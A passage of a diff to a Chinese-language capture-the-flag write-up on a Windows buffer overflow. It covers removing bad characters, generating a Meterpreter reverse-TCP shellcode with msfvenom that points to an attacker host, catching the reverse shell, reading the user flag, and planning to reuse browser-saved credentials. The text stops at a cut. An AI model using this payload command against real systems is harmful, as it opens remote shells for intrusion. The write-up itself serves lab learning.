@@ -965,4 +965,16 @@ get下载下来(使用binary二进制模式下载，不然运行会出问题)
 当其显示Unmodified时则说明坏字符已经被我们剔除干净
 坏字符是：`\x00\x0a`
 接下来使用msfvenom生成我们所需的shellcode
-msfvenom -p windows/meterpreter/reverse_tcp -f c -b "\x00\x0a" LHOST=10.14.73.43 LPORT=
+-b选项剔除了我们不需要的坏字符，这里生成的是meterpretershell
+`msfvenom -p windows/meterpreter/reverse_tcp -f c -b "\x00\x0a" LHOST=攻击机IP LPORT=攻击机端口`
+![[Pasted image 20240310220236.png]]
+![[Pasted image 20240310220310.png]]
+发送Payload前准备好meterpreter接收器监听
+![[Pasted image 20240310220435.png]]
+将上面的shellcode作为脚本的payload进行发送：
+![[Pasted image 20240310220635.png]]
+成功接收到反弹shell:
+![[Pasted image 20240310220716.png]]
+![[Pasted image 20240310220811.png]]
+拿到user.txt：`{H4lf_W4y_Th3r3}`
+可以看到桌面firefox的快捷方式，其上安装了火狐浏览器，看wp秒了，是浏览器保存的凭证可以进行利用，我们去
